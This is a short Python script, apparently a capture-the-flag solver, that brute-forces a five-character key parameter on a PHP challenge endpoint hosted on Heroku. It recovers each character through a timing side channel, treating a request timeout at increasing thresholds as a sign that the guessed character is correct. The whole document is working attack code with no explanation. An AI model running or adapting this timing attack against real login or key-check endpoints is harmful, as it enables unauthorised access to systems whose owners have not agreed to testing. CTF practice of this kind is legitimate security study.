import requests
import string
import sys

url = 'https://ctfs-chall1.herokuapp.com/bruteforce-key/kode.php'
charset = string.ascii_letters + string.digits
key = list('aaaaa')
result = ''

for pos in range(5):
    print(pos, end=' ')
    sys.stdout.flush()
    for c in charset:
        key[pos] = c
        print(c, end='')
        sys.stdout.flush()
        try:
            r = requests.get(url, params={'kunci': ''.join(key)}, timeout=0.2 * (pos + 1))
        except requests.exceptions.ReadTimeout:
            result += c
            print()
            break
    print()
